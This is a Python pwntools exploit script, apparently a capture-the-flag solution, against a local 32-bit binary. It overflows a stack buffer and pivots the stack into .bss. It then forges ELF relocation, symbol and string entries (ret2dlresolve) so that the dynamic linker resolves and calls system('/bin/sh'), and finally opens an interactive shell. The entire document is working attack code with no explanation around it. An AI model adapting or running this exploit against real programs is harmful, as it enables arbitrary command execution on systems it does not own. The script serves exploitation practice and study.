#!/usr/bin/python3
from pwn import *

write_plt = 0x80483c0
read_plt = 0x8048390
plt0 = 0x8048370

write_got = 0x804a010

ppp = 0x804856c
pop_ebp = 0x8048453
leave = 0x8048481

bss = 0x804a820

elf = ELF('./c14595742a95ebf0944804d8853b834c')

def base(section):
    return elf.get_section_by_name(section).header.sh_addr

p = process('./c14595742a95ebf0944804d8853b834c')

payload = b'a' * 0x6c
payload += b'bbbb'
payload += p32(read_plt)
payload += p32(ppp)
payload += p32(0)
payload += p32(bss)
payload += p32(0x100)
payload += p32(pop_ebp)
payload += p32(bss-4)
payload += p32(leave)
payload = payload.ljust(0x100, b'a')
p.send(payload)

fake_rel = 0x40
fake_sym = 0x50
fake_str = 0x80
fake_cmd = 0x90
reloc_arg = bss + fake_rel - base('.rel.plt')
r_info = bss + fake_sym - base('.dynsym')
# Alignment check
if r_info & 0xf > 0:
    r_info += 0x8
    fake_sym += 0x8
r_info = ((r_info // 0x10) << 8) + 0x07
st_name = bss + fake_str - base('.dynstr')
cmd = b'/bin/sh\0'

payload = p32(plt0)
payload += p32(reloc_arg)
payload += p32(ppp)
payload += p32(bss+fake_cmd)
payload += p32(0)
payload += p32(0)
payload += b'AAAA'
payload = payload.ljust(fake_rel, b'A')
payload += p32(write_got) # r_offset
payload += p32(r_info) # r_info
payload = payload.ljust(fake_sym, b'A')
payload += p32(st_name) # st_name
payload += p32(0) # st_value
payload += p32(0) # st_size
payload += p32(0x12) # st_info, st_other, st_shndx
payload = payload.ljust(fake_str, b'A')
payload += b'system\0'
payload = payload.ljust(fake_cmd, b'A')
payload += cmd
payload = payload.ljust(0x100, b'A')
p.send(payload)

p.interactive()
